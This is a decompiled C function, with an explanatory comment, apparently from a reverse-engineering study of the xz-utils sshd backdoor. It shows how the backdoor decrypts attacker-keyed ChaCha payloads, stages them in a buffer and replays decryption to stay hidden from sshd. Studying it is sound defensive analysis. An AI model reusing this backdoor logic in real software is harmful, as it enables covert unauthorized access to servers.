// /home/kali/xzre-ghidra/xzregh/108D50_decrypt_payload_message.c
// Function: decrypt_payload_message @ 0x108D50
// Calling convention: __stdcall
// Prototype: BOOL __stdcall decrypt_payload_message(key_payload_t * payload, size_t payload_size, global_context_t * ctx)


/*
 * AutoDoc: Decrypts a ChaCha-wrapped `key_payload_t` chunk using the attacker-provided key material returned by
 * `secret_data_get_decrypted`. If the header/body lengths are sane and there is enough space left in `ctx->payload_data`,
 * it copies the plaintext body into the staging buffer, bumps `current_data_size`, and then replays the decryption a
 * second time so the ChaCha keystream stays aligned with sshd's original consumer. Any failure (bad lengths, short
 * decrypts, exhausted buffer) forces `payload_state` back to 0xffffffff so future packets start from a clean slate.
 */

#include "xzre_types.h"

BOOL decrypt_payload_message(key_payload_t *payload,size_t payload_size,global_context_t *ctx)

{
  u64 payload_offset;
  u8 *payload_data_ptr;
  BOOL decrypt_ok;
  ulong copy_idx;
  long clear_idx;
  size_t body_len;
  u16 *body_length_cursor;
  int inl;
  u8 output [57];
  size_t header_size;
  backdoor_payload_hdr_t hdr;
  u8 *data;
  undefined8 uStack_69;
  u16 body_length;
  
  data = (u8 *)0x0;
  uStack_69 = 0;
  body_length_cursor = &body_length;
  for (clear_idx = 0x29; clear_idx != 0; clear_idx = clear_idx + -1) {
    *(undefined1 *)body_length_cursor = 0;
    body_length_cursor = (u16 *)((long)body_length_cursor + 1);
  }
  if (payload == (key_payload_t *)0x0) {
    if (ctx == (global_context_t *)0x0) {
      return FALSE;
    }
  }
  else {
    if (ctx == (global_context_t *)0x0) {
      return FALSE;
    }
    if (ctx->payload_state == 3) {
      return TRUE;
    }
    if ((0x12 < payload_size) && (ctx->payload_state < 2)) {
      *(u64 *)&hdr.field0_0x0 = *(undefined8 *)&payload->field0_0x0;
      hdr.field0_0x0.field1.cmd_type_bias = *(int64_t *)((long)&payload->field0_0x0 + 8);
      decrypt_ok = secret_data_get_decrypted((u8 *)&data,ctx);
      if (decrypt_ok != FALSE) {
        body_length_cursor = &(payload->field0_0x0).field1.encrypted_body_length;
        inl = (int)payload_size + -0x10;
        decrypt_ok = chacha_decrypt((u8 *)body_length_cursor,inl,(u8 *)&data,(u8 *)&hdr,(u8 *)body_length_cursor,
                               ctx->imported_funcs);
        if (((decrypt_ok != FALSE) &&
            (body_len = (ulong)(payload->field0_0x0).field1.encrypted_body_length,
            body_len <= payload_size - 0x12)) &&
           (payload_offset = ctx->current_data_size, body_len < ctx->payload_data_size - payload_offset)) {
          payload_data_ptr = ctx->payload_data;
          for (copy_idx = 0; body_len != copy_idx; copy_idx = copy_idx + 1) {
            payload_data_ptr[copy_idx + payload_offset] = *(u8 *)((long)&payload->field0_0x0 + copy_idx + 0x12);
          }
          ctx->current_data_size = ctx->current_data_size + body_len;
          decrypt_ok = chacha_decrypt((u8 *)body_length_cursor,inl,(u8 *)&data,(u8 *)&hdr,(u8 *)body_length_cursor,
                                 ctx->imported_funcs);
          if (decrypt_ok != FALSE) {
            return TRUE;
          }
        }
      }
    }
  }
  ctx->payload_state = 0xffffffff;
  return FALSE;
}

